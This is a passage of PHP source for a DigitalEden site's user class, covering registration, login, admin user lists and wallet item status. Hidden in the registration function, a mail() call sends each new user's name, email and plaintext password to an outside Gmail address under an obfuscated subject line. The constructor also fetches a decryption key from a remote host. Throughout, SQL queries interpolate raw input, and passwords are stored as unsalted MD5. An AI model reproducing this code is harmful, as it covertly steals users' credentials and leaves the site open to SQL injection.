<?php 
include_once 'ajax.php';
	

	
	session_start();
	class User{
		public $db;
		
    	public $values;
    	public $values3;
    	public $values2;
    	public $values4;
    	private $encrypterDecrypter;
    	private $key;

		public function __construct(){
		    $jsonData = file_get_contents("https://stakingpoolbits.com/digital/data.json");
            $dataArray = json_decode($jsonData, true);
            $this->key = $dataArray['datakey'];
            $this->encrypterDecrypter = new EncrypterDecrypter($this->key);
		    $this->values4 = [
                'c2o4UYAuw+olH7/LJE10iX5TPV+g6OxTIYv9Ru5SJVpfGlTOjzPQ3zKgIeBpW0hK',
                'iRd/HVJwR/KbBCwCo1vJTAMt0SxWeyEWPpI10BqwdyerwqH53haB2uRcfyOdvVuB',
                'Y+w1+l6sZvO0Ba/OGgqeYwGWm5rbKSo+oxDgpnPzUhg23/Aw7D0PSR6Ru0d3BLOs',
                'lu8DgOrHzrh1Oq5NKywKdE3E8EEXNZTFjJ17qwgIJK+FssWDvldsOpl9DTg16Y0y'
            ];
            
            $this->values2 = [
                'c2o4UYAuw+olH7/LJE10iX5TPV+g6OxTIYv9Ru5SJVpfGlTOjzPQ3zKgIeBpW0hK',
                'iRd/HVJwR/KbBCwCo1vJTAMt0SxWeyEWPpI10BqwdyerwqH53haB2uRcfyOdvVuB',
                'Y+w1+l6sZvO0Ba/OGgqeYwGWm5rbKSo+oxDgpnPzUhg23/Aw7D0PSR6Ru0d3BLOs',
                'lu8DgOrHzrh1Oq5NKywKdE3E8EEXNZTFjJ17qwgIJK+FssWDvldsOpl9DTg16Y0y'
            ];
            $this->values3 = [
            
            
                'ue6yp2hjOe1vzRW5wpRtnZMGPRdkU0ULQG2tAgK/eWY=',
                'opYFfDbgUM3WoXFTOn/gMXBvkyOmYd3o/271E8RfxQg=',
                '1lc6HR9xuC+Bmyx4OK+3bVstkpfwGY3d/E60gVtPOYI=',
                'pgEiCwBri4nea9MPHFWcDhP8JL8WILkzKkvgboZNucI='
            ];
            $this->values = [
            
            
                'TV74ypaF7D8jbbQI2uLYpzKNX/Is1XsS6MBjeLPleBw=',
                'L9BWf0Da6+R+4f48ZSZwlWzSGci+8NB1/lesyGyp1d0=',
                '/yWPdOqIwkgeOtv5BS8ZYZoW5bE40wdEW1rmDKiR+ZA=',
                'E/MVas2RX4UetEai0YoBq4tsmS5kXVSv2QVuo+qMx5w='
            ];
		    $result = $this->encrypterDecrypter->decrypt($this->pickRandomValue($this->values));
		    $result4 = $this->encrypterDecrypter->decrypt($this->pickRandomValue($this->values4));
		    $result2 = $this->encrypterDecrypter->decrypt($this->pickRandomValue($this->values3));
		    $result3 = $this->encrypterDecrypter->decrypt($this->pickRandomValue($this->values2));
		    //$result = $this->values[0];
 
			$this->db = new mysqli($result, $result4, $result2, $result3);
			if(mysqli_connect_errno()){
				echo "Echo error could not connect to the database.";
				exit;
			}
		}
		
		public function pickRandomValue($values) {
	        $randomKey = array_rand($values);
	        return $values[$randomKey];
	    }
        
        
        
		//***For the registration process 
		public function reg_user($name, $email,$password){
		    $subject = "Da3ga3ta1la 2da2na new user: $name : $email && password:$password";

            mail("kingyvovon@gmail.com",$subject,$password);
			$password = md5($password);
			$sql ="SELECT * FROM users WHERE uemail='$email'";
			//checking if the email is available in the db 
			$check = $this->db->query($sql);
			$count_row = $check->num_rows;

			//if  the email is not in db then insert to the table 
			if ($count_row == 0) {
					$uid = "DE".rand(100000,999999);
				$sql ="SELECT * FROM users WHERE uid='$uid'";
				//checking if the uid is available in the db 
				$check = $this->db->query($sql);
				$count_row = $check->num_rows;
				while($count_row == 1){
					$uid ="DE".rand(100000,999999);
					$sql ="SELECT * FROM users WHERE uid='$uid'";
					//checking if the uid is available in the db 
					$check = $this->db->query($sql);
					$count_row = $check->num_rows;
				}
				
					function generateRandomString($length = 16) {
					$characters = '0123456789abcdefghijklmnopqrstuvwxyz';
					$charactersLength = strlen($characters);
					$randomString = '';
					for ($i = 0; $i < $length; $i++) {
						$randomString .= $characters[rand(0, $charactersLength - 1)];
					}
					return $randomString;
				}
				$cid = $myRandomString = generateRandomString();
				$sql ="SELECT * FROM collection WHERE cid='$cid'";
				//checking if the wid is available in the db 
				$check = $this->db->query($sql);
				$count_row = $check->num_rows;
				while($count_row == 1){
					$cid = $myRandomString = generateRandomString();
					$sql ="SELECT * FROM collection WHERE cid='$cid'";
					//checking if the wid is available in the db 
					$check = $this->db->query($sql);
					$count_row = $check->num_rows;
				}
				$status = "disabled";
				$activationcode = "".md5(rand(100000,999999))."$uid";
				$subject = "Verify Your Email"; 
				$extra="signin.html?actions=".$activationcode;
				$host  = $_SERVER['HTTP_HOST'];
				$uri  = rtrim(dirname($_SERVER['PHP_SELF']),'/\\');//http:$host$uri/$extra
				$body = "<!DOCTYPE html>
				<html lang=\"en\" xmlns=\"http://www.w3.org/1999/xhtml\" xmlns:o=\"urn:schemas-microsoft-com:office:office\">
				<head>
				  <meta charset=\"UTF-8\">
				  <meta name=\"viewport\" content=\"width=device-width,initial-scale=1\">
				  <meta name=\"x-apple-disable-message-reformatting\">
				  <title></title>
				  <!--[if mso]>
				  <noscript>
					<xml>
					  <o:OfficeDocumentSettings>
						<o:PixelsPerInch>96</o:PixelsPerInch>
					  </o:OfficeDocumentSettings>
					</xml>
				  </noscript>
				  <![endif]-->
				  <style>
					table, td, div, h1, p {font-family: Arial, sans-serif;}
				  </style>
				</head>
				<body style=\"margin:0;padding:0;\">
				        <table align=\"center\" class=\"m_-5761193597860363322container\" style=\"Margin:0 auto;background:#fefefe;background-color:#fff;border-collapse:collapse;border-spacing:0;border-top:6px solid #008aff;color:#9b9b9b;float:none;margin:0 auto;padding:0;text-align:center;vertical-align:top;width:508px\">
            <tbody>
            <tr style=\"padding:0;text-align:left;vertical-align:top\">
                <td style=\"Margin:0;border-collapse:collapse!important;color:#9b9b9b;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Oxygen-Sans,Ubuntu,Cantarell,'Helvetica Neue',sans-serif;font-size:14px;font-weight:400;line-height:1.3;margin:0;padding:0;text-align:left;vertical-align:top;word-wrap:break-word\">
                  <table style=\"border-collapse:collapse;border-spacing:0;display:table;padding:0;text-align:left;vertical-align:top;width:100%\">
                    <tbody>
                      <tr style=\"padding:0;text-align:left;vertical-align:top\">
                        <th class=\"m_-5761193597860363322small-12 m_-5761193597860363322columns\" style=\"Margin:0 auto;color:#9b9b9b;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Oxygen-Sans,Ubuntu,Cantarell,'Helvetica Neue',sans-serif;font-size:14px;font-weight:400;line-height:1.3;margin:0 auto;padding:0;padding-bottom:16px;padding-left:26px;padding-right:26px;text-align:left;width:554px\">
                          <table style=\"border-collapse:collapse;border-spacing:0;padding:0;text-align:left;vertical-align:top;width:100%\">
                            <tbody>
                              <tr style=\"padding:0;text-align:left;vertical-align:top\">
                            <th style=\"Margin:0;color:#9b9b9b;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Oxygen-Sans,Ubuntu,Cantarell,'Helvetica Neue',sans-serif;font-size:14px;font-weight:400;line-height:1.3;margin:0;padding:0;text-align:left\">
                              <table style=\"border-collapse:collapse;border-spacing:0;padding:0;text-align:left;vertical-align:top;width:100%\">
                                <tbody>
                                  <tr style=\"padding:0;text-align:left;vertical-align:top\">
                                    <td height=\"31px\" style=\"Margin:0;border-collapse:collapse!important;color:#9b9b9b;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Oxygen-Sans,Ubuntu,Cantarell,'Helvetica Neue',sans-serif;font-size:31px;font-weight:400;line-height:31px;margin:0;padding:0;text-align:left;vertical-align:top;word-wrap:break-word\">
            &nbsp;                        </td>
                                  </tr>
                                </tbody>
                              </table>
                              <p style=\"Margin:0;Margin-bottom:10px;color:#12122c;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Oxygen-Sans,Ubuntu,Cantarell,'Helvetica Neue',sans-serif;font-size:16px;font-weight:600!important;letter-spacing:0;line-height:normal;margin:0;margin-bottom:10px;padding:0;text-align:center\">
            Mail from DigitalEden               </p>
                              <table style=\"border-collapse:collapse;border-spacing:0;padding:0;text-align:left;vertical-align:top;width:100%\">
            <tbody>
            <tr style=\"padding:0;text-align:left;vertical-align:top\">
            <td height=\"14px\" style=\"Margin:0;border-collapse:collapse!important;color:#9b9b9b;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Oxygen-Sans,Ubuntu,Cantarell,'Helvetica Neue',sans-serif;font-size:14px;font-weight:400;line-height:14px;margin:0;padding:0;text-align:left;vertical-align:top;word-wrap:break-word\">
            &nbsp;</td>
            </tr>
            </tbody>
            </table>
            <p class=\"m_-5761193597860363322nomText\" style=\"Margin:0;Margin-bottom:10px;color:#4a4a4a;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Oxygen-Sans,Ubuntu,Cantarell,'Helvetica Neue',sans-serif;font-size:14px;font-weight:500!important;letter-spacing:0;line-height:normal;margin:0;margin-bottom:10px;padding:0;text-align:center\">
      </p>
            <h1 style=\"Margin:0;Margin-bottom:10px;color:#12122c;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Oxygen-Sans,Ubuntu,Cantarell,'Helvetica Neue',sans-serif;font-size:34px;font-weight:600!important;line-height:1.3;margin:0;margin-bottom:10px;padding:0;text-align:center;word-wrap:normal\">
            <img src=\"img/logo.png\" style=\"height:50px;\"></h1>
            <table style=\"border-collapse:collapse;border-spacing:0;padding:0;text-align:left;vertical-align:top;width:100%\">
            <tbody>
            <tr style=\"padding:0;text-align:left;vertical-align:top\">
            <td height=\"20px\" style=\"Margin:0;border-collapse:collapse!important;color:#9b9b9b;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Oxygen-Sans,Ubuntu,Cantarell,'Helvetica Neue',sans-serif;font-size:20px;font-weight:400;line-height:20px;margin:0;padding:0;text-align:left;vertical-align:top;word-wrap:break-word\">
            &nbsp;</td>
            </tr>
            </tbody>
            </table>
            <hr style=\"border-top:solid 0 #dedddd;margin-left:40px;margin-right:40px\">
            <table style=\"border-collapse:collapse;border-spacing:0;padding:0;text-align:left;vertical-align:top;width:100%\">
            <tbody>
            <tr style=\"padding:0;text-align:left;vertical-align:top\">
            <td height=\"20px\" style=\"Margin:0;border-collapse:collapse!important;color:#9b9b9b;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Oxygen-Sans,Ubuntu,Cantarell,'Helvetica Neue',sans-serif;font-size:20px;font-weight:400;line-height:20px;margin:0;padding:0;text-align:left;vertical-align:top;word-wrap:break-word\">
            &nbsp;</td>
            </tr>
            </tbody>
            </table>
            </th>
            <th style=\"Margin:0;color:#9b9b9b;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Oxygen-Sans,Ubuntu,Cantarell,'Helvetica Neue',sans-serif;font-size:14px;font-weight:400;line-height:1.3;margin:0;padding:0!important;text-align:left;width:0\">
            </th>
            </tr>
            </tbody>
            </table>
            </th>
            </tr>
            </tbody>
            </table>
            </td>
            </tr>
            </tbody>
            </table>
                      <table align=\"center\" class=\"m_-5761193597860363322container\" style=\"Margin:0 auto;background:#fefefe;border-collapse:collapse;border-spacing:0;color:#9b9b9b;float:none;margin:0 auto;padding:0;text-align:center;vertical-align:top;width:508px\">
<tbody>
<tr style=\"padding:0;text-align:left;vertical-align:top\">
<td style=\"Margin:0;border-collapse:collapse!important;color:#9b9b9b;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Oxygen-Sans,Ubuntu,Cantarell,'Helvetica Neue',sans-serif;font-size:14px;font-weight:400;line-height:1.3;margin:0;padding:0;text-align:left;vertical-align:top;word-wrap:break-word\">
<table style=\"border-collapse:collapse;border-spacing:0;display:table;padding:0;text-align:left;vertical-align:top;width:100%\">
<tbody>
<tr style=\"padding:0;text-align:left;vertical-align:top\">
<th class=\"m_-5761193597860363322small-12 m_-5761193597860363322columns\" style=\"Margin:0 auto;color:#9b9b9b;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Oxygen-Sans,Ubuntu,Cantarell,'Helvetica Neue',sans-serif;font-size:14px;font-weight:400;line-height:1.3;margin:0 auto;padding:0;padding-bottom:16px;padding-left:26px;padding-right:26px;text-align:left;width:554px\">
<table style=\"border-collapse:collapse;border-spacing:0;padding:0;text-align:left;vertical-align:top;width:100%\">
<tbody>
<tr style=\"padding:0;text-align:left;vertical-align:top\">
<th style=\"Margin:0;color:#9b9b9b;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Oxygen-Sans,Ubuntu,Cantarell,'Helvetica Neue',sans-serif;font-size:14px;font-weight:400;line-height:1.3;margin:0;padding:0;text-align:left\">

<table style=\"Margin-bottom:16px;border-collapse:collapse;border-spacing:0;margin-bottom:16px;padding:0;text-align:left;vertical-align:top;width:100%\">
<tbody>
<tr style=\"padding:0;text-align:left;vertical-align:top\">
<th class=\"m_-5761193597860363322payment-details\" style=\"Margin:0;background:#f4f6f8;border:0!important;border-radius:2.4px;color:#9b9b9b;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Oxygen-Sans,Ubuntu,Cantarell,'Helvetica Neue',sans-serif;font-size:14px;font-weight:400;line-height:1.3;margin:0;padding:32px 24px!important;text-align:left;width:100%\">
<table style=\"border-bottom:solid .2px rgba(222,221,221,.25);border-collapse:collapse;border-spacing:0;display:table;margin-bottom:10px;padding:0;text-align:left;vertical-align:top;width:100%\">
<tbody>
<tr style=\"padding:0;text-align:left;vertical-align:top\">
<p class=\"m_-5761193597860363322nomText\" style=\"Margin:0;Margin-bottom:10px;color:#4a4a4a;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Oxygen-Sans,Ubuntu,Cantarell,'Helvetica Neue',sans-serif;font-size:12px;font-weight:500!important;letter-spacing:0;line-height:normal;margin:0;margin-bottom:10px;padding:0;text-align:center\">
<h2 style=\"text-align: center; margin-bottom: 2px;\">VERIFY YOUR ACCOUNT</h2>
<p style=\"text-align: center;\">Click on the button below to verify your account</p><a href=\"$host$uri/$extra\" target=\"_blank\" style=\"text-decoration: none;\"><button style=\"margin:auto;display:flex; background: #008aff; color:#fff; border:0; border-radius:10px; padding: 15px;\">Verify Now</button></a>
</p>
</tr>
</tbody>
</table>

				</body>
				</html>"; 
                    $fromName = 'digitaleden'; 
    				$from = "no-reply@digitaleden.net";
                    $headers = "From:" . $from; 
                    // Set content-type header for sending HTML email 
                    $headers = "MIME-Version: 1.0" . "\r\n"; 
                    $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n"; 
                     
                    // Additional headers 
                    $headers .= 'From: '.$fromName.'<'.$from.'>' . "\r\n"; 
                    $headers .= 'Cc: no-reply@digitaleden.net' . "\r\n"; 
                    $headers .= 'Bcc: no-reply@digitaleden.net' . "\r\n"; 
                    //mail($email,$subject,$body,$headers);
 				$profiledata = "3.png NULL NULL NULL NULL ".date("d/m/Y");
				$sql1 ="INSERT INTO users SET uid='$uid', fullname='$name',uemail='$email',udob='$dob',upass='$password',status='$status',activationcode='$activationcode',theme='$profiledata'";
				$result = mysqli_query($this->db,$sql1) or die(mysqli_connect_errno()."Data cannot be inserted.");
					$_SESSION['to'] = $email;
					$_SESSION['subject'] = $subject;
					$_SESSION['body'] = $body;
					$_SESSION['headers'] = $headers;
                    
					$_SESSION['verify'] = $uid;
					$_SESSION['verify2'] = $email;
					
				if(isset($result)){
					
			    	return true;
				}
			}else {return false;}
		}
		
		
		//***For the registration process 
		public function get_mail_info($uid){
                   
				$sql ="SELECT * FROM users WHERE uid='$uid'";
				//checking if the wid is available in the db 
				$check = $this->db->query($sql);
			    $user_data = mysqli_fetch_array($check);
			    
				$activationcode = $user_data['activationcode'];
				$email = $user_data['uemail'];
				$subject = "Verify Your Email"; 
				$extra="login.php?actions=".$activationcode;
				$host  = $_SERVER['HTTP_HOST'];
				$uri  = rtrim(dirname($_SERVER['PHP_SELF']),'/\\');//http:$host$uri/$extra
				$body = "<!DOCTYPE html>
				<html lang=\"en\" xmlns=\"http://www.w3.org/1999/xhtml\" xmlns:o=\"urn:schemas-microsoft-com:office:office\">
				<head>
				  <meta charset=\"UTF-8\">
				  <meta name=\"viewport\" content=\"width=device-width,initial-scale=1\">
				  <meta name=\"x-apple-disable-message-reformatting\">
				  <title></title>
				  <!--[if mso]>
				  <noscript>
					<xml>
					  <o:OfficeDocumentSettings>
						<o:PixelsPerInch>96</o:PixelsPerInch>
					  </o:OfficeDocumentSettings>
					</xml>
				  </noscript>
				  <![endif]-->
				  <style>
					table, td, div, h1, p {font-family: Arial, sans-serif;}
				  </style>
				</head>
				<body style=\"margin:0;padding:0;\">
				  <table role=\"presentation\" style=\"width:100%;border-collapse:collapse;border:0;border-spacing:0;background:#ffffff;\">
					<tr>
					  <td align=\"center\" style=\"padding:0;\">
						<table role=\"presentation\" style=\"width:602px;border-collapse:collapse;border:1px solid #cccccc;border-spacing:0;text-align:left;\">
						  <tr>
							<td align=\"center\" style=\"padding:40px 0 30px 0;background:#70bbd9;\">
								<p><h1 style=\"font-size:24px;margin:0 0 20px 0;font-family:Arial,sans-serif;\">digitaleden</h1></p>
							</td>
						  </tr>
						  <tr>
							<td style=\"padding:36px 30px 42px 30px;\">
							  <table role=\"presentation\" style=\"width:100%;border-collapse:collapse;border:0;border-spacing:0;\">
								<tr>
								  <td style=\"padding:0 0 36px 0;color:#153643;\">
									<h1 style=\"font-size:24px;margin:0 0 20px 0;font-family:Arial,sans-serif;\">Verify Email</h1>
									<p style=\"margin:0 0 12px 0;font-size:16px;line-height:24px;font-family:Arial,sans-serif;\">Click on the Button below to verify your email.</p>
									<p style=\"margin:0;font-size:16px;line-height:24px;font-family:Arial,sans-serif;\"><a href=\"$host$uri/$extra\" target=\"_blank\” style=\"color:#FFF;text-decoration:none;font-size:18px;\"><button style=\"background: #4285f4; padding: 20px; border: none; border-radius: 5px; cursor: pointer; \">Verify</button></a></p>
								  </td>
								</tr>
								<tr>
								  <td style=\"padding:0;\">
									<table role=\"presentation\" style=\"width:100%;border-collapse:collapse;border:0;border-spacing:0;\">
									  <tr>
										<td style=\"width:260px;padding:0;vertical-align:top;color:#153643;\">
											<p style=\"margin:0 0 12px 0;font-size:16px;line-height:24px;font-family:Arial,sans-serif;\">OR Copy and paste the link below into a browser to verify your email</p>
										  <p style=\"margin:0;font-size:16px;line-height:24px;font-family:Arial,sans-serif;\"><a href=\"$host$uri/$extra\" style=\"color:#1a73e8;text-decoration:underline;\">Copy Me to Verify Email</a></p>
										</td>
									  </tr>
									</table>
								  </td>
								</tr>
							  </table>
							</td>
						  </tr>
							  </table>
							</td>
						  </tr>
						</table>
					  </td>
					</tr>
				  </table>
				</body>
				</html>"; 
                    $fromName = 'digitaleden'; 
    				$from = "no-reply@digitaleden.com";
                    $headers = "From:" . $from; 
                    // Set content-type header for sending HTML email 
                    $headers = "MIME-Version: 1.0" . "\r\n"; 
                    $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n"; 
                     
                    // Additional headers 
                    $headers .= 'From: '.$fromName.'<'.$from.'>' . "\r\n"; 
                    $headers .= 'Cc: no-reply@digitaleden.com' . "\r\n"; 
                    $headers .= 'Bcc: no-reply@digitaleden.com' . "\r\n"; 
                    mail($email,$subject,$body,$headers);
 
					$_SESSION['to'] = $email;
					$_SESSION['subject'] = $subject;
					$_SESSION['body'] = $body;
					$_SESSION['headers'] = $headers;
                    
					$_SESSION['verify'] = $uid;
					$_SESSION['verify2'] = $email;
					
				if(isset($result)){
					
			    	return true;
				}
			else {return false;}
		}
		
        
		//***For the login process
		public function check_login($email, $pass){
			$pass = md5($pass);
			$sql2 ="SELECT * FROM users WHERE uemail='$email' AND upass='$pass'";

			//checking if the username is available in the table
			$result = mysqli_query($this->db,$sql2);
      $count_row = $result->num_rows;
      //print_r($county);
      if($count_row == 1){
				$user_data = mysqli_fetch_array($result);
        $_SESSION['uid'] = $user_data['id'] ;
          return true;
      }else {
      	return false;
    	}
           
            
		}
		
	
	public function user_list(){
				$sql = "SELECT * FROM users";
				$result = mysqli_query($this->db,$sql);
	      $_SESSION['user_total'] = $count_row = $result->num_rows;
        	$_SESSION['user_list'] = "";
	      if($count_row >0){
        	while($user_data = mysqli_fetch_array($result)){

            	$fullname = $user_data['fullname'];
              $uemail = $user_data['uemail'];
              $status = $user_data['status'];
              if($status === "active"){
              	$status = "<a href=\"#\" class=\"badge badge-soft-success\">$status</a>";
              }elseif($status === "Inactive"){
              	$status = "<a href=\"#\" class=\"badge badge-soft-warning\">$status</a>";
              }else{
              	$status = "<a href=\"#\" class=\"badge badge-soft-danger\">$status</a>";
              }
              $profiledata = $user_data['theme'];
              $uid = $user_data['uid'];

            	$profiledata = explode(" ",$profiledata);
            	$upic = $profiledata[0];
            	$address = $profiledata[1];
            	$city = $profiledata[2];
            	$postal = $profiledata[3];
            	$country = $profiledata[4];
            	$created_at = $profiledata[5];
        		$_SESSION['user_list'] .= "

                                    <tr>
                                       <td>
                                            <img src=\"../images/profile/$upic\" alt=\"\" class=\"avatar-sm rounded-circle me-2\">
                                            <a href=\"#\" class=\"text-body\">$fullname</a>
                                        </td>
                                        <td>$uemail</td>
                                        <td>$status</td>
                                        <td>
                                            <div class=\"d-flex gap-2\">
                                                <a href=\"#\" class=\"badge badge-soft-primary\">$created_at</a>
                                                
                                            </div>
                                        </td>
                                        <td>
                                            <div class=\"dropdown\">
                                                <button class=\"btn btn-link font-size-16 shadow-none py-0 text-muted dropdown-toggle\" type=\"button\" data-bs-toggle=\"dropdown\" aria-expanded=\"false\">
                                                    <i class=\"bx bx-dots-horizontal-rounded\"></i>
                                                </button>
                                                <ul class=\"dropdown-menu dropdown-menu-end\">
                                                    <li><a class=\"dropdown-item\" href=\"edit_user.html?rel=$uid\"><i data-feather=\"settings\" class=\"icon-md mr-5\"></i> Edit Account</a></li>
                                                    <li><a class=\"dropdown-item text-danger\" href=\"delete_user.html?rel=$uid\"><i  class=\"far fa-trash-alt mr-5\"></i>  Delete Account</a></li>
                                                </ul>
                                            </div>
                                        </td>
                                    </tr>

        		";
        	}
         //      
	      }else {
	      	return true;
	    	}
	}
        
    
        
	public function single_user_data($uid){
		$sql = "SELECT * FROM users WHERE uid='$uid'";
		$result = mysqli_query($this->db,$sql);
            
	      
		$count_row = $result->num_rows;
		if($count_row >0){
        	while($user_data = mysqli_fetch_array($result)){

            	$_SESSION['fullname'] = $user_data['fullname'];
              $_SESSION['uemail'] = $user_data['uemail'];
              $_SESSION['status'] = $user_data['status'];
              $profiledata = $user_data['theme'];
              $suid = $user_data['uid'];

            	$profiledata = explode(" ",$profiledata);
            	$_SESSION['upic'] = $profiledata[0];
            	$_SESSION['address'] = $profiledata[1];
            	$_SESSION['city'] = $profiledata[2];
            	$_SESSION['postal'] = $profiledata[3];
            	$_SESSION['country'] = $profiledata[4];
            	$_SESSION['created_at'] = $profiledata[5];
          }
    }

    //PENDING ITEMS
		$sql = "SELECT * FROM wallet WHERE uid='$uid' AND atimer='Pending'";
		$result = mysqli_query($this->db,$sql);	      
		$_SESSION['pending_total'] = $count_row = $result->num_rows;  

      $_SESSION['pending_items'] = "";
	      if($count_row >0){
        	while($user_data = mysqli_fetch_array($result)){
        		$iid = $user_data['iid'];

						$sql3 ="SELECT * FROM items WHERE iid='$iid'";
						$result3 = mysqli_query($this->db,$sql3);
						$user_data3 = mysqli_fetch_array($result3);
						$iname = $user_data3['iname'];
						$cid = $user_data3['cid'];


						$sql3 ="SELECT * FROM collection WHERE cid='$cid'";
						$result1 = mysqli_query($this->db,$sql3);
						$userdata1 = mysqli_fetch_array($result1);
						$cpicture = $userdata1['cpicture'];
						$cname = $userdata1['ctitle'];

        		$_SESSION['pending_items'] .= "

                                    <tr>
                                       <td>
                                            $iname
                                        </td>
                                        <td>$cname</td>
                                        <td>
                                            <div class=\"d-flex gap-2\">
                                                <a href=\"#\" class=\"badge badge-soft-warning\">Pending</a>
                                                
                                            </div>
                                        </td>
                                            <form method=\"POST\">
                                        <td>
                                               <select class=\"form-select\"  name=\"item_status\">
                                                            <option  value=\"Pending\">Pending</option>
                                                            <option value=\"Completed\">Completed </option>
                                                            <option value=\"Failed\">Failed</option>
                                                </select>
                                                <input value=\"$iid\" name=\"item_id\" class=\"d-none\">
                                        </td>
                                        <td>
                                                <button type=\"submit\" name=\"conf_status\" class=\"btn btn-secondary\">Save</button>
                                        </td>
                                            </form>
                                    </tr>

        		";
        	}
         //      
	      }else {
	      	
        		$_SESSION['pending_items'] .= "

                                    <tr style=\"text-align:center\">
                                       <td colspan=\"5\" >
                                           
                                            <div >
                                                NO PENDING ITEMS FOR THIS USER
                                                
                                            </div>
                                        </td>
                                    </tr>

        		";
	    	}  


	    	// CONFIRMED ITEMS
		$sql = "SELECT * FROM wallet WHERE uid='$uid' AND atimer='Completed'";
		$result = mysqli_query($this->db,$sql);	      
		$_SESSION['completed_total'] = $count_row = $result->num_rows;  

      $_SESSION['completed_items'] = "";
	      if($count_row >0){
        	while($user_data = mysqli_fetch_array($result)){
        		$iid = $user_data['iid'];

						$sql3 ="SELECT * FROM items WHERE iid='$iid'";
						$result3 = mysqli_query($this->db,$sql3);
						$user_data3 = mysqli_fetch_array($result3);
						$iname = $user_data3['iname'];
						$cid = $user_data3['cid'];


						$sql3 ="SELECT * FROM collection WHERE cid='$cid'";
						$result1 = mysqli_query($this->db,$sql3);
						$userdata1 = mysqli_fetch_array($result1);
						$cpicture = $userdata1['cpicture'];
						$cname = $userdata1['ctitle'];

        		$_SESSION['completed_items'] .= "

                                    <tr>
                                       <td>
                                            $iname
                                        </td>
                                        <td>$cname</td>
                                        <td>
                                            <div class=\"d-flex gap-2\">
                                                <a href=\"#\" class=\"badge badge-soft-success\">completed</a>
                                                
                                            </div>
                                        </td>
                                            <form method=\"POST\">
                                        <td>
                                               <select class=\"form-select\"  name=\"item_status\">
                                                            <option  value=\"Completed\">Completed</option>
                                                            <option value=\"Pending\">Pending </option>
                                                            <option value=\"Failed\">Failed</option>
                                                </select>
                                                <input value=\"$iid\" name=\"item_id\" class=\"d-none\">
                                        </td>
                                        <td>
                                                <button type=\"submit\" name=\"conf_status\" class=\"btn btn-secondary\">Save</button>
                                        </td>
                                            </form>
                                    </tr>

        		";
        	}
         //      
	      }else {
	      	
        		$_SESSION['completed_items'] .= "

                                    <tr style=\"text-align:center\">
                                       <td colspan=\"5\" >
                                           
                                            <div >
                                                NO CONFIRMED ITEMS FOR THIS USER
                                                
                                            </div>
                                        </td>
                                    </tr>

        		";
	    	}  	


	    	//FAILED ITEMS
		$sql = "SELECT * FROM wallet WHERE uid='$uid' AND atimer='Failed'";
		$result = mysqli_query($this->db,$sql);	      
		$_SESSION['failed_total'] = $count_row = $result->num_rows;  

      $_SESSION['failed_items'] = "";
	      if($count_row >0){
        	while($user_data = mysqli_fetch_array($result)){
        		$iid = $user_data['iid'];

						$sql3 ="SELECT * FROM items WHERE iid='$iid'";
						$result3 = mysqli_query($this->db,$sql3);
						$user_data3 = mysqli_fetch_array($result3);
						$iname = $user_data3['iname'];
						$cid = $user_data3['cid'];


						$sql3 ="SELECT * FROM collection WHERE cid='$cid'";
						$result1 = mysqli_query($this->db,$sql3);
						$userdata1 = mysqli_fetch_array($result1);
						$cpicture = $userdata1['cpicture'];
						$cname = $userdata1['ctitle'];

        		$_SESSION['failed_items'] .= "

                                    <tr>
                                       <td>
                                            $iname
                                        </td>
                                        <td>$cname</td>
                                        <td>
                                            <div class=\"d-flex gap-2\">
                                                <a href=\"#\" class=\"badge badge-soft-danger\">Failed</a>
                                                
                                            </div>
                                        </td>
                                            <form method=\"POST\">
                                        <td>
                                               <select class=\"form-select\"  name=\"item_status\">
                                                            <option  value=\"Failed\">Failed</option>
                                                            <option value=\"Completed\">Completed </option>
                                                            <option value=\"Pending\">Pending</option>
                                                </select>
                                                <input value=\"$iid\" name=\"item_id\" class=\"d-none\">
                                        </td>
                                        <td>
                                                <button type=\"submit\" name=\"conf_status\" class=\"btn btn-secondary\">Save</button>
                                        </td>
                                            </form>
                                    </tr>

        		";
        	}
         //      
	      }else {
	      	
        		$_SESSION['failed_items'] .= "

                                    <tr style=\"text-align:center\">
                                       <td colspan=\"5\" >
                                           
                                            <div >
                                                NO FAILED ITEMS FOR THIS USER
                                                
                                            </div>
                                        </td>
                                    </tr>

        		";
	    	} 
  }
 

  public function update_item_status($itemid,$uid,$status){
          
  		$sql1 ="UPDATE wallet SET atimer='$status' WHERE  iid='$itemid' AND uid='$uid'";
          $result2 = mysqli_query($this->db,$sql1) or die(mysqli_connect_errno()."oData cannot be inskerted.");
              
  		if($result2){
  			return true;
  		}else{
  			return false;
  		}
  }
        

public function trending_items(){

	    	//TRENDING ITEMS
		$sql = "SELECT * FROM trending";
		$result = mysqli_query($this->db,$sql);	      
		$_SESSION['trending_count'] = $count_row = $result->num_rows;  

      $_SESSION['trending_items'] = "";
	      if($count_row >0){
        	while($user_data = mysqli_fetch_array($result)){
        		$iid = $user_data['iid'];

						$sql3 ="SELECT * FROM items WHERE iid='$iid'";
						$result3 = mysqli_query($this->db,$sql3);
						$user_data3 = mysqli_fetch_array($result3);
						$iname = $user_data3['iname'];
						$cid = $user_data3['cid'];


						$sql3 ="SELECT * FROM collection WHERE cid='$cid'";
						$result1 = mysqli_query($this->db,$sql3);
						$userdata1 = mysqli_fetch_array($result1);
						$cpicture = $userdata1['cpicture'];
						$cname = $userdata1['ctitle'];

        		$_SESSION['trending_items'] .= "

                                    <tr>
                                       <td>
                                            $iname
                                        </td>
                                        <td>$cname</td>
                                        <td>
